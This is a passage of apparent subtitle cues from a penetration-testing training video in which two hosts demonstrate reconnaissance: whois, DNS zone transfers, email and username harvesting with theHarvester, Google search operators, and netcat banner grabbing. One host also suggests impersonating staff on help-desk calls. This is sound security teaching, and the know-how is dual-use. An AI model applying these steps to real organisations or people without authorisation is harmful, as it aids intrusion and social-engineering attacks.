00:10:13.020\nSo you gotta remember, learn your tools or\ncreate your own custom script.\n\n219\n00:10:13.020 --> 00:10:15.310\nSo I did a ping sweep\nof that entire network.\n\n220\n00:10:15.310 --> 00:10:18.411\n&gt;&gt; Yeah, and a really great look, too,\nat the grep and the cut commands.\n\n221\n00:10:18.411 --> 00:10:22.746\nAnd how we can use those with our tools to\nformat that output into something I might\n\n222\n00:10:22.746 --> 00:10:25.130\nthen turn around and use somewhere else.\n\n223\n00:10:25.130 --> 00:10:27.770\nKeep just the information you want.\n\n224\n00:10:27.770 --> 00:10:29.090\n&gt;&gt; That's exactly right.\n\n225\n00:10:29.090 --> 00:10:34.557\nAll right, let's talk about more\nInternet stuff, and DNS specifically.\n\n226\n00:10:34.557 --> 00:10:37.196\nSo DNS is a great service, we like DNS.\n\n227\n00:10:37.196 --> 00:10:39.603\nDNS can actually give up\na lot of information,\n\n228\n00:10:39.603 --> 00:10:42.147\nsome information that\nit probably shouldn't.\n\n229\n00:10:42.147 --> 00:10:46.230\nAnd nowadays it doesn't usually, okay?\n\n230\n00:10:46.230 --> 00:10:48.000\nIf it does, you've done a great thing.\n\n231\n00:10:48.000 --> 00:10:49.520\nIt's called a zone transfer.\n\n232\n00:10:49.520 --> 00:10:54.370\nIf it does a zone transfer,\nyou're basically saying, hey, DNS server,\n\n233\n00:10:54.370 --> 00:10:58.650\nwould you mind giving me every\nrecord of everything that you have?\n\n234\n00:10:58.650 --> 00:11:01.840\nI mean, I just wanna see it, that's all.\n\n235\n00:11:01.840 --> 00:11:02.880\n&gt;&gt; You can trust me.\n\n236\n00:11:02.880 --> 00:11:05.790\n&gt;&gt; Yeah, you might see where\nthat's probably not a good thing\n\n237\n00:11:05.790 --> 00:11:06.940\nthat it would do that.\n\n238\n00:11:06.940 --> 00:11:10.660\nBecause it's basically saying,\nhere's every host I have a record for.\n\n239\n00:11:10.660 --> 00:11:14.180\nAnd now you have a definitive list\nof every host it has a record for.\n\n240\n00:11:14.180 --> 00:11:16.525\nIf I'm doing this against DNS server for\n\n241\n00:11:16.525 --> 00:11:20.250\nMicrosoft.com it's gonna\ntell me every host.\n\n242\n00:11:20.250 --> 00:11:24.780\nSo typically, when you try to do a full\nzone transfer, it's not gonna happen.\n\n243\n00:11:24.780 --> 00:11:26.280\nYou can do this with endmap,\n\n244\n00:11:26.280 --> 00:11:29.490\nyou can do this with a whois query,\ngreat way to do it.\n\n245\n00:11:29.490 --> 00:11:31.960\nDig is another great tool for that.\n\n246\n00:11:31.960 --> 00:11:34.350\nWhat's another one, host-\n&gt;&gt; Nslookup.\n\n247\n00:11:34.350 --> 00:11:35.440\n&gt;&gt; Yeah, nslookup, right.\n\n248\n00:11:35.440 --> 00:11:37.910\nIt has been around forever,\neverybody can do it.\n\n249\n00:11:37.910 --> 00:11:40.080\nVery simple, play around with those.\n\n250\n00:11:40.080 --> 00:11:47.240\nI found one [INAUDIBLE] show you any\nof them, I mean let's do a whois.\n\n251\n00:11:47.240 --> 00:11:49.340\nTake a look,\nobviously there's a lot of options here.\n\n252\n00:11:49.340 --> 00:11:51.701\nI think you just have to give it the host,\nyeah.\n\n253\n00:11:51.701 --> 00:11:56.740\nJust -h, what host you want,\nand you're off to the races.\n\n254\n00:11:56.740 --> 00:12:03.139\nSo let's try that,\nsay whois -h microsoft.com.\n\n255\n00:12:03.139 --> 00:12:05.058\nI'm not plugged into the network here.\n\n256\n00:12:05.058 --> 00:12:11.382\nLet me actually connect to the Internet so\nthat it can work.\n\n257\n00:12:11.382 --> 00:12:15.886\nNow remember, if you're in an internal\nLAN and have a DNS server that's local,\n\n258\n00:12:15.886 --> 00:12:17.421\nthat would have been fine.\n\n259\n00:12:17.421 --> 00:12:22.465\nBut I don't so, I want to show\nyou something, so let's do that.\n\n260\n00:12:22.465 --> 00:12:25.934\nMicrosoft.com.\n\n261\n00:12:25.934 --> 00:12:30.070\nLet's see, it doesn't like that,\nlet me get rid of that.\n\n262\n00:12:30.070 --> 00:12:33.490\nMicrosoft.com, I spelled it correctly.\n\n263\n00:12:33.490 --> 00:12:33.990\nMaybe I don't need the -h, there we go.\n\n264\n00:12:35.660 --> 00:12:39.520\nAnd so it starts giving me a lot of\ninformation about microsoft.com.\n\n265\n00:12:39.520 --> 00:12:41.790\nA lot of really good information\nthat might be in here.\n\n266\n00:12:42.890 --> 00:12:47.920\nBack in the day people,\nwould put here's the sysadmin's name and\n\n267\n00:12:47.920 --> 00:12:51.230\nemail address, phone number,\nroom number, all that.\n\n268\n00:12:51.230 --> 00:12:53.850\nYou'll see all this\ninformation is in here.\n\n269\n00:12:53.850 --> 00:12:55.390\nLook at that, there's the street address.\n\n270\n00:12:55.390 --> 00:12:59.371\n1 Microsoft Way, Redmond,\nWashington 98052.\n\n271\n00:12:59.371 --> 00:13:01.608\nThere's their phone numbers.\n\n272\n00:13:01.608 --> 00:13:05.125\n&gt;&gt; Yeah, in a lot of organizations,\nif they made their registration.\n\n273\n00:13:05.125 --> 00:13:08.608\nCuz this is basically looking\nin the registrar databases for\n\n274\n00:13:08.608 --> 00:13:13.290\nthe Internet when you register like i\nwant to own or register mikerodrick.com.\n\n275\n00:13:13.290 --> 00:13:17.190\nI make that registration through a\nreseller or through one of the registrars\n\n276\n00:13:17.190 --> 00:13:19.660\ndirectly, and\nthey keep that database of information.\n\n277\n00:13:19.660 --> 00:13:20.410\nAnd it used to be,\n\n278\n00:13:20.410 --> 00:13:23.890\nas you said, we provide all kinds of\ninformation in that registration.\n\n279\n00:13:23.890 --> 00:13:28.300\nWho to contact, what our mailing\naddress was, what our fax number was.\n\n280\n00:13:28.300 --> 00:13:33.330\nWe've gotten wiser these days and a lot of\nthem are now doing private registrations,\n\n281\n00:13:33.330 --> 00:13:35.130\nwhere we hide a lot of that information.\n\n282\n00:13:35.130 --> 00:13:37.990\nBut definitely a great place to start,\nbecause you don't know, and\n\n283\n00:13:37.990 --> 00:13:39.780\nyou need to find information.\n\n284\n00:13:39.780 --> 00:13:43.710\nThis is publicly available information,\nwe're not breaking any laws, any rules.\n\n285\n00:13:43.710 --> 00:13:47.450\nWe're just using whois to query\nthat registar database and\n\n286\n00:13:47.450 --> 00:13:50.020\nsee what information we can start\npulling back on our targets.\n\n287\n00:13:50.020 --> 00:13:50.880\n&gt;&gt; That's it.\n\n288\n00:13:50.880 --> 00:13:53.223\nAnd that's the cool thing about this,\n\n289\n00:13:53.223 --> 00:13:56.642\nis right now we're being very\npassive in our discovery.\n\n290\n00:13:56.642 --> 00:13:59.560\nAll right, there's active scanning and\nthere's passive scanning.\n\n291\n00:13:59.560 --> 00:14:00.780\nRight now we're being very passive.\n\n292\n00:14:00.780 --> 00:14:05.060\nWe're just asking for freely available\ninformation that they give out.\n\n293\n00:14:05.060 --> 00:14:09.200\nAnd through that information\nwe start to build a picture\n\n294\n00:14:09.200 --> 00:14:10.860\nof the systems that we're going after.\n\n295\n00:14:10.860 --> 00:14:14.070\nSo that's gonna be helpful for\nyou as you continue.\n\n296\n00:14:14.070 --> 00:14:20.020\n&gt;&gt; Another one that I know used to be done\na lot in the past, it's not done as much.\n\n297\n00:14:20.020 --> 00:14:23.500\nBut email addresses that\nwe would put on websites.\n\n298\n00:14:23.500 --> 00:14:27.350\nAre there tools I could use to\nstart gathering that information?\n\n299\n00:14:27.350 --> 00:14:30.920\n&gt;&gt; Yeah, that's actually really good\ninformation because think about it.\n\n300\n00:14:30.920 --> 00:14:33.460\nIf you're at a company or you have or\nmaybe you're in school or\n\n301\n00:14:33.460 --> 00:14:34.450\nsomething like that.\n\n302\n00:14:34.450 --> 00:14:37.310\nThey typically will give you\nan email address, right?\n\n303\n00:14:37.310 --> 00:14:40.410\nThat email address is also your user name,\nright?\n\n304\n00:14:40.410 --> 00:14:46.040\nSo that's a good way to start enumerating\nuser names for systems is looking for\n\n305\n00:14:46.040 --> 00:14:49.990\nemail addresses that aren't\nlike system@mycompany.com.\n\n306\n00:14:49.990 --> 00:14:53.000\n&gt;&gt; Or if I want to start doing\nsome social engineering.\n\n307\n00:14:53.000 --> 00:14:57.620\nIt’s easy to call somebody at\nthe help desk or one of these users.\n\n308\n00:14:57.620 --> 00:15:00.430\nI've got the email address of some\nof their IT guys, I can try to\n\n309\n00:15:00.430 --> 00:15:04.050\nuse those names, make it sound like I\nwork there and get a lot of headway.\n\n310\n00:15:04.050 --> 00:15:06.070\n&gt;&gt; I actually tried to do\nthat to get a job one time.\n\n311\n00:15:06.070 --> 00:15:06.630\n&gt;&gt; Did you?\n&gt;&gt; Yeah,\n\n312\n00:15:06.630 --> 00:15:11.680\nwhen I was fresh out of school and\nI was like it's a security job.\n\n313\n00:15:11.680 --> 00:15:12.770\nThat'd be awesome.\n\n314\n00:15:12.770 --> 00:15:15.180\nSo I did a look up and\nthere was the guy, right?\n\n315\n00:15:15.180 --> 00:15:18.920\nI couldn't get a hold of anybody,\nno one would return a phone call.\n\n316\n00:15:18.920 --> 00:15:20.930\nSo it was apparently a who\nyou know kind of thing.\n\n317\n00:15:20.930 --> 00:15:21.490\n&gt;&gt; Right.\n\n318\n00:15:21.490 --> 00:15:24.495\n&gt;&gt; So I found out who the guy\nregistered and his phone number and\n\n319\n00:15:24.495 --> 00:15:25.325\nI called him directly.\n\n320\n00:15:25.325 --> 00:15:26.755\nAnd I was like, hey yeah,\nI'm calling about the job.\n\n321\n00:15:26.755 --> 00:15:28.014\nHe said, how did you get this number?\n\n322\n00:15:28.014 --> 00:15:28.988\n&gt;&gt; [LAUGH]\n&gt;&gt; I said well,\n\n323\n00:15:28.988 --> 00:15:30.375\nit is a security job, right?\n\n324\n00:15:30.375 --> 00:15:33.749\nI wanted to show you that I'm\ngood at security and you're not.\n\n325\n00:15:33.749 --> 00:15:35.594\n&gt;&gt; [LAUGH]\n&gt;&gt; I didn't get that job,\n\n326\n00:15:35.594 --> 00:15:37.865\nnot even a call back, I don't know why.\n\n327\n00:15:37.865 --> 00:15:40.965\nBut yeah, so a lot of fun there.\n\n328\n00:15:40.965 --> 00:15:44.665\nAll right, but Mike's point was,\nemail addresses, can we gather those?\n\n329\n00:15:44.665 --> 00:15:48.549\nYeah, there's a cool tool,\nI love saying that, called the harvester.\n\n330\n00:15:48.549 --> 00:15:52.716\nAnd not the Metallica song The Harvester\nof Sorrows, Language of the Mad.\n\n331\n00:15:52.716 --> 00:15:57.478\nNo, it is the harvester of harvesting\nemail addresses.\u007f Very cool, and\n\n332\n00:15:57.478 --> 00:15:59.224\nit's a command line tool.\n\n333\n00:15:59.224 --> 00:16:05.860\nLet me clear my screen, and let's see\nhow the good old harvester works.\n\n334\n00:16:05.860 --> 00:16:10.140\nSo, I can do theharvester, all one word,\n\n335\n00:16:10.140 --> 00:16:15.570\nharvester, kind of looks weird when\nyou type it all out like that, dash d.\n\n336\n00:16:15.570 --> 00:16:17.860\nAnd then say something like microsoft.com.\n\n337\n00:16:17.860 --> 00:16:20.570\nAll right, we've been playing\nwith Microsoft, so we'll do that.\n\n338\n00:16:20.570 --> 00:16:23.300\nI'm going to limit this to 20 results,\nmaybe make it 30.\n\n339\n00:16:23.300 --> 00:16:26.480\nGet a little extra on it.\n\n340\n00:16:26.480 --> 00:16:27.520\nAnd then dash b.\n\n341\n00:16:27.520 --> 00:16:32.210\nThis is basically your crawler,\nyour searcher.\n\n342\n00:16:32.210 --> 00:16:33.560\nWhich one do you want to use?\n\n343\n00:16:33.560 --> 00:16:39.808\nIt's got quite a few that you can use like\nGoogle, Bing, I think PGP is one of them.\n\n344\n00:16:39.808 --> 00:16:41.180\n[CROSSTALK] Yes,\nthere's a bunch on the list.\n\n345\n00:16:41.180 --> 00:16:42.457\nWe'll take a look, let's just run this.\n\n346\n00:16:42.457 --> 00:16:44.449\nI'm gonna do all of them,\nI'm just gonna crank them.\n\n347\n00:16:44.449 --> 00:16:46.794\nGive me an all, hit Return.\n\n348\n00:16:46.794 --> 00:16:50.030\nHarvester gives us cool ASCII art.\n\n349\n00:16:50.030 --> 00:16:51.800\nThank you, boys, for\nthe awesome ASCII art.\n\n350\n00:16:51.800 --> 00:16:52.450\nWe appreciate that.\n\n351\n00:16:52.450 --> 00:16:55.079\n&gt;&gt; Now you can see PGP Server,\nyeah, is one of the sources.\n\n352\n00:16:56.360 --> 00:16:57.210\nAnd it's cranking away.\n\n353\n00:16:57.210 --> 00:17:01.000\n&gt;&gt; It shouldn't take, depending, this\nis why I limited this thing to just 30,\n\n354\n00:17:01.000 --> 00:17:05.200\nbecause Microsoft's a big entity this\nscan would, if I just did dash all and\n\n355\n00:17:05.200 --> 00:17:08.910\nlet it go, let it rip,\nprobably would take a long time scanning.\n\n356\n00:17:08.910 --> 00:17:11.898\nAnother one of those things we\nlike to let you know, I love it,\n\n357\n00:17:11.898 --> 00:17:17.030\nyou watch trending and they say yeah, use\nthis tool, and you get the information.\n\n358\n00:17:17.030 --> 00:17:18.740\nYeah.\nSometimes using that tool and\n\n359\n00:17:18.740 --> 00:17:21.500\ngetting that information\ncan take a long time.\n\n360\n00:17:21.500 --> 00:17:22.470\nThis is one of those times.\n\n361\n00:17:22.470 --> 00:17:23.900\nIt could take a very long time.\n\n362\n00:17:23.900 --> 00:17:25.530\nSo you have to understand.\n\n363\n00:17:25.530 --> 00:17:29.160\nNow the good thing is as a hacker,\ntime is usually on your side.\n\n364\n00:17:29.160 --> 00:17:32.440\nAs a penetration tester, you're\ndoing as a living, time might not so\n\n365\n00:17:32.440 --> 00:17:35.820\nmuch be on your side should you need\nto expediate things if you can.\n\n366\n00:17:35.820 --> 00:17:38.610\nBut, we've got a lot of information here.\n\n367\n00:17:38.610 --> 00:17:41.788\nLook at what we've discovered.\n\n368\n00:17:41.788 --> 00:17:45.120\nLots of interesting stuff\nhere to be honest with you.\n\n369\n00:17:47.380 --> 00:17:49.750\n&gt;&gt; Yeah, some of the stuff it\npulls back seems rather random.\n\n370\n00:17:49.750 --> 00:17:51.440\n&gt;&gt; It does seem rather random.\n\n371\n00:17:51.440 --> 00:17:54.930\nThese are probably, like websites that\nare associated with Microsoft.com or\n\n372\n00:17:54.930 --> 00:17:55.960\n&gt;&gt; That have some\n\n373\n00:17:55.960 --> 00:17:57.430\nreference to-\n&gt;&gt; Yes.\n\n374\n00:17:57.430 --> 00:18:00.710\nI want to get to where\nthe email addresses are.\n\n375\n00:18:00.710 --> 00:18:02.040\nWay in the top here.\n\n376\n00:18:02.040 --> 00:18:03.150\nI should have went with 20 but I did not.\n\n377\n00:18:03.150 --> 00:18:07.370\nNow you are starting to see\nmore Microsoft.com stuff,\n\n378\n00:18:07.370 --> 00:18:11.040\nhosts found in search engines,\nemails found.\n\n379\n00:18:11.040 --> 00:18:13.350\nNow here is the good stuff.\n\n380\n00:18:13.350 --> 00:18:15.415\nSo we got '@microsoft.com or\n\n381\n00:18:15.415 --> 00:18:20.010\nsingle quote at microsoft.com I\nwonder what that does, right?\n\n382\n00:18:20.010 --> 00:18:21.910\nThis should start your wheels a turning.\n\n383\n00:18:21.910 --> 00:18:25.440\nI actually really am interested in finding\nout what the heck that apostrophe,\n\n384\n00:18:25.440 --> 00:18:27.860\nwhere does that email go?\n\n385\n00:18:27.860 --> 00:18:32.430\njava@microsoft.com, so maybe you're\nhaving Java errors with Microsoft here.\n\n386\n00:18:32.430 --> 00:18:35.270\nOpen source, what's the zhang.\n\n387\n00:18:35.270 --> 00:18:37.020\nThat's probably a user.\n\n388\n00:18:37.020 --> 00:18:39.210\nThat's somebody that works at Microsoft.\n\n389\n00:18:39.210 --> 00:18:41.310\nThere's their IP address.\n\n390\n00:18:41.310 --> 00:18:43.130\nProbably also their user name.\n\n391\n00:18:43.130 --> 00:18:45.090\nSo, if I was targeting a system.\n\n392\n00:18:45.090 --> 00:18:48.130\nNow I at least have what\nis most likely a username.\n\n393\n00:18:48.130 --> 00:18:50.170\nSo I start to build that list.\n\n394\n00:18:50.170 --> 00:18:53.900\nGood stuff there and just to be thorough,\nlet's see what else they found.\n\n395\n00:18:53.900 --> 00:18:54.830\nFull harvest in Google.\n\n396\n00:18:54.830 --> 00:18:56.380\nOkay, good.\nYeah, we hit the top of the page there.\n\n397\n00:18:57.660 --> 00:19:00.150\nSo the harvester can do that for you.\n\n398\n00:19:00.150 --> 00:19:02.500\nLet's scroll on down,\nI can just hit enter a few times.\n\n399\n00:19:02.500 --> 00:19:03.130\nThere we go.\n\n400\n00:19:03.130 --> 00:19:03.650\nWhere we at?\n\n401\n00:19:03.650 --> 00:19:09.860\nSo that was emails, DNS,\nall good things, Google hacking.\n\n402\n00:19:09.860 --> 00:19:10.840\nRight, don't forget Google.\n\n403\n00:19:10.840 --> 00:19:12.870\nThat's your friend,\nour friend Adam Gordon,\n\n404\n00:19:12.870 --> 00:19:15.565\nhe loves to call it the Oracle of\nthe Internet cuz it knows everything.\n\n405\n00:19:15.565 --> 00:19:16.970\n&gt;&gt; [LAUGH]\n&gt;&gt; I'd be\n\n406\n00:19:16.970 --> 00:19:18.970\nhard pressed to tell him he's\nwrong on that, fact be known.\n\n407\n00:19:18.970 --> 00:19:24.162\nThere's a lot of information you\ncan glean from Google itself.\n\n408\n00:19:24.162 --> 00:19:28.650\nA lot of sites, ITProTV,\nwe are a public entity,\n\n409\n00:19:28.650 --> 00:19:32.610\nwe want you to find us,\nwe want you to come to our site.\n\n410\n00:19:32.610 --> 00:19:33.510\nSo, what do we do?\n\n411\n00:19:33.510 --> 00:19:38.300\nWe make ourselves out there on\nthe Internet, we try to push our product.\n\n412\n00:19:38.300 --> 00:19:39.500\nA lot of companies do the same thing.\n\n413\n00:19:39.500 --> 00:19:44.636\nThey have a public facing\nface I guess to be redundant.\n\n414\n00:19:44.636 --> 00:19:47.150\n&gt;&gt; [LAUGH]\n&gt;&gt; Right they are facing the public.\n\n415\n00:19:47.150 --> 00:19:48.880\nWe want you to see us.\n\n416\n00:19:48.880 --> 00:19:50.540\nWell I can get a lot of\ninformation from that.\n\n417\n00:19:50.540 --> 00:19:51.910\nI can find things.\n\n418\n00:19:51.910 --> 00:19:52.800\nThrow a harvester at it.\n\n419\n00:19:52.800 --> 00:19:54.910\nFind some email address, right?\n\n420\n00:19:54.910 --> 00:19:57.260\nI can maybe look do you have any PDF's?\n\n421\n00:19:57.260 --> 00:19:59.300\nDo you have any hidden files?\n\n422\n00:19:59.300 --> 00:20:03.310\nIf I just wanna search your site\nspecifically for something.\n\n423\n00:20:03.310 --> 00:20:06.120\nMaybe something I found that\ncould be a vulnerability.\n\n424\n00:20:06.120 --> 00:20:09.350\nMaybe you do webcams.\n\n425\n00:20:09.350 --> 00:20:12.080\nYou resell webcams,\nyou refurbish them and sell webcams.\n\n426\n00:20:13.600 --> 00:20:15.430\nHere's our models.\n\n427\n00:20:15.430 --> 00:20:18.590\nWell, if you refurbish them,\nodds are you might be using them.\n\n428\n00:20:18.590 --> 00:20:19.780\nI can look in your site.\n\n429\n00:20:19.780 --> 00:20:21.120\nDoes that exist?\n\n430\n00:20:21.120 --> 00:20:25.140\nRight?\nSo you use things like the site in URL,\n\n431\n00:20:25.140 --> 00:20:27.690\nin file, or file type, should I say?\n\n432\n00:20:28.760 --> 00:20:32.660\nThings of that nature with Google\nto get a lot of information.\n\n433\n00:20:32.660 --> 00:20:36.550\nLet's pick on Microsoft some more and\nlet's see what goes on here.\n\n434\n00:20:36.550 --> 00:20:37.820\nJust opening up a web browser,\n\n435\n00:20:37.820 --> 00:20:41.770\ngoing to, I haven't Google\nis my default search engine.\n\n436\n00:20:41.770 --> 00:20:47.476\nSo I can just go to my search bar and\nsay, site,\n\n437\n00:20:47.476 --> 00:20:53.315\ncolon, Microsoft.\n\n438\n00:20:53.315 --> 00:20:56.140\nRealsoft.com.\n\n439\n00:20:56.140 --> 00:20:59.000\nThere we go.\nWe get Microsoft Notice\n\n440\n00:20:59.000 --> 00:21:01.966\neverything has Microsoft.com.\n\n441\n00:21:01.966 --> 00:21:06.360\nMicrosoft.com, I get nothing\nthat's not Microsoft.com.\n\n442\n00:21:06.360 --> 00:21:07.650\nIf I wanna exclude one of those,\n\n443\n00:21:07.650 --> 00:21:10.800\nI can say minus site whatever\nexclusions I wanna make.\n\n444\n00:21:10.800 --> 00:21:12.330\nSo www.microsoft.com.\n\n445\n00:21:12.330 --> 00:21:15.010\nDon't care about their public website.\n\n446\n00:21:15.010 --> 00:21:19.170\nGive me something that's not so\nclose to the surface.\n\n447\n00:21:19.170 --> 00:21:21.060\n&gt;&gt; I use this all the time\njust in my daily surfing,\n\n448\n00:21:21.060 --> 00:21:24.980\nlike I want to look up something on, let's\nsay, Windows deployment services, and when\n\n449\n00:21:24.980 --> 00:21:29.650\nI do a search on that, depending on, you\nknow, what search engine, you get results\n\n450\n00:21:29.650 --> 00:21:34.880\nfrom Microsoft as well as many blogs and\narticles that other people have written.\n\n451\n00:21:34.880 --> 00:21:35.800\nI want it from Microsoft.\n\n452\n00:21:35.800 --> 00:21:37.330\nI want to hear it from the horse's mouth.\n\n453\n00:21:37.330 --> 00:21:38.980\nI'm not looking for anybody's opinion.\n\n454\n00:21:38.980 --> 00:21:43.760\nI want, maybe I'm looking for\na particular requirement or what have you.\n\n455\n00:21:43.760 --> 00:21:49.850\nYou can do that, site:technet, and now all\nmy results will come, just from technet.\n\n456\n00:21:49.850 --> 00:21:51.960\nAnd it's a great way to\nfilter your results.\n\n457\n00:21:51.960 --> 00:21:55.010\nAnd just to clarify one thing Daniel said\nthere, when he says, Google hacking.\n\n458\n00:21:55.010 --> 00:21:58.870\nI know most of us understand what that\nmeans but we're not hacking Google.\n\n459\n00:21:58.870 --> 00:21:59.550\nRight?\n[INAUDIBLE]\n\n460\n00:21:59.550 --> 00:22:00.780\n&gt;&gt; Good call Mike.\n\n461\n00:22:00.780 --> 00:22:03.270\n&gt;&gt; Yeah it does sound like that\nlets do some Google hacking.\n\n462\n00:22:03.270 --> 00:22:04.760\nWe're not hacking Google.\n\n463\n00:22:04.760 --> 00:22:07.960\nWe're using Google to\nfacilitate the hacking.\n\n464\n00:22:07.960 --> 00:22:08.490\nRight?\nOr\n\n465\n00:22:08.490 --> 00:22:10.980\npenetration testing I guess\nwould be a better way to say it.\n\n466\n00:22:10.980 --> 00:22:14.280\nBut they've got the search engines,\nthey've got all of the stuff\n\n467\n00:22:14.280 --> 00:22:18.930\nindexed they can find it, and\nwhat a lot of people don't realize is that\n\n468\n00:22:18.930 --> 00:22:22.830\nwhen you put stuff out on the web,\nit's gonna be found by these spiders.\n\n469\n00:22:22.830 --> 00:22:26.370\nI mean there are ways to block\nthings from those spiders,\n\n470\n00:22:26.370 --> 00:22:28.560\nbut most people don't realize that either.\n\n471\n00:22:28.560 --> 00:22:31.070\nSo people will put things\nout there on the web,\n\n472\n00:22:31.070 --> 00:22:33.080\nthat they don't think\nanybody else is gonna see.\n\n473\n00:22:33.080 --> 00:22:37.020\nHey, I'm gonna have this page, and\nit's gonna have some of my things I\n\n474\n00:22:37.020 --> 00:22:41.390\nneed internally when I'm working, I'm not\ngoing to link to it from any other page so\n\n475\n00:22:41.390 --> 00:22:43.400\nthere's no way anybody's\never going to get to it.\n\n476\n00:22:43.400 --> 00:22:44.180\nJust me.\n\n477\n00:22:44.180 --> 00:22:45.620\nIt might have passwords on there.\n\n478\n00:22:45.620 --> 00:22:47.000\nAccount names.\n\n479\n00:22:47.000 --> 00:22:48.980\nIP addresses things like that.\n\n480\n00:22:48.980 --> 00:22:49.610\nGuess what.\n\n481\n00:22:49.610 --> 00:22:51.640\nGoogle Spiders found it.\n\n482\n00:22:51.640 --> 00:22:56.060\nThey will crawl those pages and they will\nbe indexed and knowing the right search\n\n483\n00:22:56.060 --> 00:22:59.560\nterms to put in there, you can find\namazing things on the Internet.\n\n484\n00:22:59.560 --> 00:23:00.200\n&gt;&gt; Yeah, no doubt.\n\n485\n00:23:00.200 --> 00:23:02.680\nGoogle is a crazy, crazy, insane thing.\n\n486\n00:23:02.680 --> 00:23:07.110\nThat if you really learn how to use\nGoogle, man you're a dangerous person.\n\n487\n00:23:07.110 --> 00:23:09.710\nCuz you'll be able to find information\nnobody even knew was there.\n\n488\n00:23:09.710 --> 00:23:10.920\nIt's a crazy thing.\n\n489\n00:23:10.920 --> 00:23:14.520\nSo check that out, learn how to use\nGoogle, so that when you are working with\n\n490\n00:23:14.520 --> 00:23:19.960\na publically facing organization, you can\nglean a lot of information through that.\n\n491\n00:23:19.960 --> 00:23:22.340\nAll right,\nlet's talk about banner grabbing.\n\n492\n00:23:22.340 --> 00:23:23.550\nIt's an important concept.\n\n493\n00:23:23.550 --> 00:23:24.860\nYou gotta know banner grabbing.\n\n494\n00:23:24.860 --> 00:23:29.630\nBasically what we mean by banner grabbing\nis, it's when you connect to a service,\n\n495\n00:23:29.630 --> 00:23:33.060\na lot of times it will talk back to you,\nwhen you make the connection and\n\n496\n00:23:33.060 --> 00:23:35.440\nsay hi, I'm service X.\n\n497\n00:23:35.440 --> 00:23:37.690\nAnd this is my version,\nand this is what I do.\n\n498\n00:23:37.690 --> 00:23:39.500\nAnd thanks for making a connection.\n\n499\n00:23:39.500 --> 00:23:40.200\nIt's going on.\n\n500\n00:23:40.200 --> 00:23:42.080\nAnd you're like okay, great.\n\n501\n00:23:43.140 --> 00:23:47.172\nUsually that's the client that's receiving\nthat, so you have some maybe a web front\n\n502\n00:23:47.172 --> 00:23:50.765\nend, or you've got a third party tool\nthat connects to a server in some way.\n\n503\n00:23:50.765 --> 00:23:54.711\nAnd they make that connection and you're\nnone the wiser, you just see the tool,\n\n504\n00:23:54.711 --> 00:23:57.748\nyou interact with your input data,\nit outputs information.\n\n505\n00:23:57.748 --> 00:24:00.147\nAnd then you are off to the races right?\n\n506\n00:24:00.147 --> 00:24:06.580\nWhat I want to do, through banner grabbing\nis find out the bits of information.\n\n507\n00:24:06.580 --> 00:24:07.760\nWhat is that service?\n\n508\n00:24:08.880 --> 00:24:11.470\nWhat anything else you want\nto tell me about yourself?\n\n509\n00:24:11.470 --> 00:24:13.260\nAnd that can be really helpful.\n\n510\n00:24:13.260 --> 00:24:17.710\nAgain we are building a picture of\nour target of what is going on there.\n\n511\n00:24:17.710 --> 00:24:19.799\nBecause we are going to eventually\nlook for vulnerabilities.\n\n512\n00:24:20.860 --> 00:24:22.610\nSo let us take a look at banner grabbing.\n\n513\n00:24:22.610 --> 00:24:26.560\nThe easy way to do banner grabbing is\nusing NetCat, our good old friend NC.\n\n514\n00:24:26.560 --> 00:24:28.830\nSo I am going to clear the screen.\n\n515\n00:24:30.820 --> 00:24:35.270\nAnd what I can do is if I scanned, looked,\nand found some services that are open,\n\n516\n00:24:35.270 --> 00:24:39.370\nmaybe somebody has port\n80 open of that nature.\n\n517\n00:24:39.370 --> 00:24:42.930\nI I can I can use NetCat\nto connect to that port.\n\n518\n00:24:42.930 --> 00:24:47.080\nThis is where I've talked about before you\ncan use TelNet to do the very same thing.\n\n519\n00:24:47.080 --> 00:24:52.196\nI find NetCat to be better at this because\nI can always kill the NetCat connection.\n\n520\n00:24:52.196 --> 00:24:56.880\nSometimes I have to actually close\nthe terminal to kill a TelNet connection.\n\n521\n00:24:56.880 --> 00:25:00.675\nThey get connected and\nit's like we're married for life.\n\n522\n00:25:00.675 --> 00:25:01.360\n&gt;&gt; [LAUGH]\n&gt;&gt; You know,\n\n523\n00:25:01.360 --> 00:25:04.010\nyou've got to kill one of them,\nto make it stop.\n\n524\n00:25:04.010 --> 00:25:07.330\nSo I typically stick with NetCat for this.\n\n525\n00:25:07.330 --> 00:25:12.280\nSo just NC NV just like we've done before.\n\n526\n00:25:12.280 --> 00:25:15.600\nAnd then, pick your host, so\nI'll just do the local host here.\n\n527\n00:25:15.600 --> 00:25:18.900\nAnd I think I might have some\nservices open, so like port 80,\n\n528\n00:25:18.900 --> 00:25:22.940\nC, return, yeah,\nI don't have, let me start.\n\n529\n00:25:22.940 --> 00:25:29.830\nI have a little script that starts\nmy services for me, myserver.sh.\n\n530\n00:25:29.830 --> 00:25:32.440\nAnd I will start them, and there we go.\n\n531\n00:25:32.440 --> 00:25:34.530\nLet's try that NetCat connection again.\n\n532\n00:25:34.530 --> 00:25:36.710\nThere we go.\nI didn't get a whole lot of information\n\n533\n00:25:36.710 --> 00:25:38.400\nout of this, there we go.\n\n534\n00:25:38.400 --> 00:25:41.910\nI did, I hit enter,\nbecause it wasn't really doing anything.\n\n535\n00:25:41.910 --> 00:25:44.300\nIt probably would have timed out,\nand the stuff would have came back.\n\n536\n00:25:44.300 --> 00:25:46.696\nBut look at all this\ninformation that I'm getting.\n\n537\n00:25:46.696 --> 00:25:50.762\nServer, Apache 2.4.25\nrunning on a WM machine.\n\n538\n00:25:50.762 --> 00:25:53.366\nSo that's a lot of information.\n\n539\n00:25:53.366 --> 00:25:55.340\n&gt;&gt; That's huge\n&gt;&gt; That's some very good information to be\n\n540\n00:25:55.340 --> 00:25:56.810\nhonest with you.\n\n541\n00:25:56.810 --> 00:25:58.320\nLet's see what else we see here.\n\n542\n00:25:59.920 --> 00:26:02.890\nI know that it's running HTML,\nokay that's great.\n\n543\n00:26:02.890 --> 00:26:05.415\nWe're running web,\nI know this actually a web server.\n\n544\n00:26:05.415 --> 00:26:07.600\n[LAUGH] And it gives me this,\n\n545\n00:26:07.600 --> 00:26:10.190\nyour browser sent a request that\nthe server cannot understand.\n\n546\n00:26:10.190 --> 00:26:11.850\nOkay, good for me.\n\n547\n00:26:11.850 --> 00:26:13.650\nMore information about that, port 80.\n\n548\n00:26:13.650 --> 00:26:17.910\nSo right out of the gate, I got a good\nbanner with some really good information.\n\n549\n00:26:17.910 --> 00:26:21.820\nI now know that that IP I found,\nand it is running port 80.\n\n550\n00:26:21.820 --> 